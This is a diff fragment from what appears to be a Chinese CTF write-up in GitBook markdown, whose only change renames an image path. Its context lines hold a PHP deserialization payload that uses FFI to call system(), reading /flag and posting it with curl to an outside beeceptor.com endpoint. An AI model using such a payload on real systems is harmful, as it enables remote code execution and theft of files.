@@ -155,7 +155,7 @@ echo base64_encode(serialize(new A()));
 ?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__get('ret')->system("echo `cat /flag` > 1.txt;curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @1.txt"));
 ```
 
-![](<../../.gitbook/assets/image (35).png>)
+![](<../../.gitbook/assets/image (35) (1).png>)
 
 ## 小结
 
